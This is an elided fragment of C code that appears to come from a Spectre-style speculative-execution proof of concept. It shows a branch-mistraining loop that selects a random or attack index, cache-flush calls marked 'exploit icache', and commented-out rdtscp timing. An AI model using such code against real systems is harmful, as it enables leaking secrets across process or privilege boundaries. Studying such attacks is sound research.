            ...
            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j) {
             ...
             for (int tt =0; tt <256*L1_BLOCK_SZ_BYTES; tt++){
                ...
                effIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 
                 _mm_clflush(&dummy); //exploit icache
                //  _mm_clflush(&test); //exploit dcache
                BARRIER 
                ...
                // addr = &array1[4 * L1_BLOCK_SZ_BYTES];
                // //  junk = *addr;
                //  uint64_t access_time2 = __rdtscp(&junk);
                // junk = *addr;
                // uint64_t start = __rdtscp(&junk) - access_time2;
                /*exploit icache*/
